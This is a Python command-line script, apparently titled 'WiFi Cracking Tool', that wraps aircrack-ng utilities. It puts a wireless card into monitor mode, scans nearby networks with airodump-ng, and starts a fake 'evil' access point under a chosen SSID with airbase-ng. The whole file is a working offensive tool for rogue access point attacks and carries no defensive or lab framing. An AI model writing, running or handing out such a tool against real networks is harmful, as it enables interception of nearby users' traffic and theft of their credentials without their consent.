import subprocess

def scan_networks(interface):
    """
    Scan for available WiFi networks using the specified interface.
    Requires root privileges.
    """
    try:
        # Put interface in monitor mode
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        mon_interface = interface + 'mon'

        # Scan for networks
        print(f"Scanning for networks on {mon_interface}...")
        result = subprocess.run(['airodump-ng', mon_interface], capture_output=True, text=True)

        # Print the scan results
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("Interrupted by user.")


def create_evil_ap(interface, ssid, channel=6):
    """
    Create a fake (evil) WiFi access point using aircrack-ng's airbase-ng tool.
    Requires root privileges.
    """
    try:
        # Put interface in monitor mode
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        mon_interface = interface + 'mon'

        # Start the fake AP
        print(f"Starting evil AP '{ssid}' on channel {channel} using {mon_interface}")
        subprocess.run([
            'airbase-ng',
            '-e', ssid,
            '-c', str(channel),
            mon_interface
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("Interrupted by user.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="WiFi Cracking Tool")
    parser.add_argument('interface', help="Network interface to use (e.g., wlan0)")
    parser.add_argument('--scan', action='store_true', help="Scan for available WiFi networks")
    parser.add_argument('--evil-ap', metavar='SSID', help="Create an evil AP with the specified SSID")
    parser.add_argument('--channel', type=int, default=6, help="Channel for the evil AP (default: 6)")

    args = parser.parse_args()

    if args.scan:
        scan_networks(args.interface)
    elif args.evil_ap:
        create_evil_ap(args.interface, args.evil_ap, args.channel)
    else:
        parser.print_help()